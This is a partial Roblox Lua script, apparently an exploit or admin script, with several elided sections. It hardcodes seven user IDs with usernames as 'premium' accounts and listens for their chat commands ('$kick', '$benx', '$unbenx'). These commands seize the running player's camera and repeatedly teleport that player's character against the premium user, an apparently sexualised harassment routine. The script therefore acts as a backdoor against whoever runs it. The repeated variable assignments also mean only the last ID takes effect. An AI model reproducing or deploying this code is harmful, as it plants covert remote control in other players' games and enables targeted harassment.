...
warn("------------------------------------------------------------------------------------------------------")
while true do 
local premium = game:GetService("Players"):GetPlayerByUserId(2452452863) --qcnqy
local premium = game:GetService("Players"):GetPlayerByUserId(2604028397) --12xErykk2
local premium = game:GetService("Players"):GetPlayerByUserId(3215415009) --ztmave
local premium = game:GetService("Players"):GetPlayerByUserId(3254506659) --jestemfajny780
local premium = game:GetService("Players"):GetPlayerByUserId(1999623054) --fv4lx
local premium = game:GetService("Players"):GetPlayerByUserId(1456523092) --xxxlolaxlol
local premium = game:GetService("Players"):GetPlayerByUserId(2244576018) --ZaCzArOwAnA_JeStEm
...
premium.Chatted:connect(function(cht)
	if cht:match("$kick .") then
		if game.Players.LocalPlayer ~= premium then
...
premium.Chatted:connect(function(cht)
	if cht:match("$benx .") then
		if game.Players.LocalPlayer ~= premium then
			...
			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = premium.Character.HumanoidRootPart
			local benxed = true
			while benxed == true do
				...
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = premium.Character.HumanoidRootPart.CFrame + premium.Character.HumanoidRootPart.CFrame.lookVector * 0.5
...
premium.Chatted:connect(function(cht)
	if cht:match("$unbenx .") then
		if game.Players.LocalPlayer ~= premium then
			...
			wait(15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium.Character.UpperTorso.Position)
		end
	end
